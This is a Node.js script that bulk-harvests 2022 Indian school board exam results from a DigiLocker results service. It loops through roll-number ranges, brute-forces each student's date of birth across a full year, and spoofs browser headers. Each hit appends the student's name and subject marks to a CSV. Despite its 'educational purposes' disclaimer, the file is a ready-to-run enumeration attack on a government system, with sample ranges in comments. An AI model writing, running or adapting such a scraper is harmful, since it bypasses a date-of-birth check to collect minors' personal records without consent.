//Script To Fetch All Results in A Roll Number Range
//Made By Krish Jha
// This script is just for educational purposes, the author is not responsible for any harm caused by this script.

let fetch = require("node-fetch");
let fs = require('fs');

async function save12thResult(rollStartRange, rollEndRange, schoolCode, fileName) {
    fs.writeFileSync(fileName, 'Roll No,Name,Sub 1,Test Mark 1,Practical Mark 1,Sub 2,Test Mark 2,Practical Mark 2,Sub 3,Test Mark 3,Practical Mark 3,Sub 4,Test Mark 4,Practical Mark 4,Sub 5,Test Mark 5,Practical Mark 5');

    let headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "referer": "https://umangresults.digilocker.gov.in/",
        "referrer-policy": "strict-origin-when-cross-origin",
        "authority": "results.digilocker.gov.in",
        "scheme": "https",
        "path": "/results/MetaData_HSCER",
        "origin": "https://umangresults.digilocker.gov.in",
        "accept-encoding": "gzip, deflate, br"
    };
    for(let rollNo = rollStartRange; rollNo < rollEndRange; rollNo++) {
        fetch12th(rollNo, schoolCode, fileName, headers);
    }
}

async function fetch12th(rollNo, schoolCode, fileName, headers){
    let response = await fetch("https://results.digilocker.gov.in/results/MetaData_HSCER", {
        "headers": headers,
        "body": `rroll=${rollNo}&doctype=HSCER&sch=${schoolCode}&year=2022`,
        "method": "post"
    });
    let json = await response.text();
    try {
        let metadata = JSON.parse(json).DocDetails.MetadataContent;
        let name = metadata.CNAME;
        let roll = metadata.RROLL;
        let subjectName1 = metadata.SNAME1;
        let marks11 = metadata.MRK11;
        let marks12 = metadata.MRK12;
        let subjectName2 = metadata.SNAME2;
        let marks21 = metadata.MRK21;
        let marks22 = metadata.MRK22;
        let subjectName3 = metadata.SNAME3;
        let marks31 = metadata.MRK31;
        let marks32 = metadata.MRK32;
        let subjectName4 = metadata.SNAME4;
        let marks41 = metadata.MRK41;
        let marks42 = metadata.MRK42;
        let subjectName5 = metadata.SNAME5;
        let marks51 = metadata.MRK51;
        let marks52 = metadata.MRK52;

        fs.appendFileSync(fileName, "\n" + [name, roll,
            subjectName1, marks11, marks12,
            subjectName2, marks21, marks22,
            subjectName3, marks31, marks32,
            subjectName4, marks41, marks42,
            subjectName5, marks51, marks52].join(","));
    } catch (e){
        console.log(rollNo);
    }
}

async function save10thResult(rollStartRange, rollEndRange, dobStartRange, dobEndRange, fileName) {
    fs.writeFileSync(fileName, 'Roll No,Name,Sub 1,Test Mark 1,Practical Mark 1,Sub 2,Test Mark 2,Practical Mark 2,Sub 3,Test Mark 3,Practical Mark 3,Sub 4,Test Mark 4,Practical Mark 4,Sub 5,Test Mark 5,Practical Mark 5');

    let headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "referer": "https://umangresults.digilocker.gov.in/",
        "referrer-policy": "strict-origin-when-cross-origin",
        "authority": "results.digilocker.gov.in",
        "scheme": "https",
        "path": "/results/MetaData",
        "origin": "https://umangresults.digilocker.gov.in",
        "accept-encoding": "gzip, deflate, br"
    };
    let dateArray = dateRange(dobStartRange, dobEndRange);
    for(let rollNo = rollStartRange; rollNo < rollEndRange; rollNo++) {
        fetch10th(rollNo, dateArray, headers, fileName);
    }
}

let count = 0;

let successCount = 0;

async function fetch10th(rollNo, dateArray, headers, fileName){
    for(let i = 0; i < dateArray.length; i++) {
        await sleep(300);
        let dob = dateArray[i];
        let response = await fetch("https://results.digilocker.gov.in/results/MetaData", {
            "headers": headers,
            "body": `rroll=${rollNo}&doctype=SSCER&dob=${dob}&year=2022`,
            "method": "post"
        });
        let json = await response.text();
        count++;
        try {
            let metadata = JSON.parse(json).DocDetails.MetadataContent;
            let name = metadata.CNAME;
            let roll = metadata.RROLL;
            let subjectName1 = metadata.SUB1NM;
            let marks11 = metadata.MRK11;
            let marks12 = metadata.MRK12;
            let subjectName2 = metadata.SUB2NM;
            let marks21 = metadata.MRK21;
            let marks22 = metadata.MRK22;
            let subjectName3 = metadata.SUB3NM;
            let marks31 = metadata.MRK31;
            let marks32 = metadata.MRK32;
            let subjectName4 = metadata.SUB4NM;
            let marks41 = metadata.MRK41;
            let marks42 = metadata.MRK42;
            let subjectName5 = metadata.SUB5NM;
            let marks51 = metadata.MRK51;
            let marks52 = metadata.MRK52;

            fs.appendFileSync(fileName, "\n" + [name, roll,
                subjectName1, marks11, marks12,
                subjectName2, marks21, marks22,
                subjectName3, marks31, marks32,
                subjectName4, marks41, marks42,
                subjectName5, marks51, marks52].join(","));
            successCount++;
            console.log("Success Fetched Results Of  : " + successCount + " Students");
        } catch (e) {
            //console.log(rollNo);
        }
        //console.log(count);
    }
}

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

function dateRange(startDate, endDate, steps = 1) {
    const dateArray = [];
    let currentDate = new Date(startDate);

    while (currentDate <= new Date(endDate)) {
        dateArray.push(formatDate(currentDate));
        currentDate.setUTCDate(currentDate.getUTCDate() + steps);
    }

    return dateArray;
}

function formatDate(date) {
        let month = '' + (date.getMonth() + 1);
        let day = '' + date.getDate();
        let year = date.getFullYear();

    if (month.length < 2)
        month = '0' + month;
    if (day.length < 2)
        day = '0' + day;

    return [day, month, year].join('/');
}

let name = Math.floor(new Date() / 1000);

//Change School Code And Change Roll Number Start Range And End Range
//save12thResult(14000000, 14000000, 20000, name + ".csv");

//Change Change Roll Number Start Range And End Range And Change Dob Start Range And End Range
//save10thResult(22185887, 22185950, '4/1/2005', '4/1/2006', name + ".csv");
